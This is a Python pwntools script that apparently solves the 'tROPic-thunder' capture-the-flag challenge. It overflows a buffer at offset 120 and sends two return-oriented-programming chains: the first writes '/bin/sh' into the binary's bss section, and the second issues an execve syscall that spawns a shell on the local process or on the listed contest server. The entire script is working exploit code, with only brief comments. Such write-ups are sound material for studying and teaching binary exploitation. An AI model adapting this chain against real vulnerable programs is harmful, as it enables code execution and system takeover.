#!user/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './tROPic-thunder'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

local = True
if(local):
    io = process(exe)
else:
    io = remote('thunder.sdc.tf', 1337)

# =========================================================
#                         ADDRESSES
# =========================================================
pop_rdx_rsi = 0x45b079      # pop rdx; pop rsi; ret;
pop_rax = 0x4005af          # pop rax; ret;
pop_rdi = 0x4006a6          # pop rdi; ret;
bss = elf.bss() 
syscall = 0x484105          # syscall; ret; 
back_to_main = 0x0400c47    #
mov_rax_rdi = 0x421ce3      # mov rax, rdi; ret;
ret = 0x400416              # ret;

# =========================================================
#                         EXPLOITS
# =========================================================

# Got manually through cyclic gdb-pwndbg
offset = 120

payload = flat({
    offset: [
        pop_rax,
        bss,
        pop_rdi,
        '/bin/sh\x00',
        mov_rax_rdi,
        ret,
        back_to_main
    ]
})

# send 1st payload to set /bin/sh string to bss section
io.sendlineafter(b'you\'ll really be in the jungle with this one!', payload)

# flattening  payload here
# prerequisite:  
# rax = 0x3b 
# rdi = bss = /bin/sh
# rdx = 0
# rsi = 0
# execve("/bin/sh", 0, 0)
payload = flat({
    offset: [
        pop_rax,        0x3b,
        pop_rdi,        bss,
        pop_rdx_rsi,    0, 0,
        syscall
    ]
})

# send 2nd payload to syscall to get shell
io.sendlineafter(b'you\'ll really be in the jungle with this one!', payload)

io.interactive()

# gdbscript = '''
# init-pwndbg
# continue
# '''.format(**locals())
# gdb.attach(io, gdbscript=gdbscript)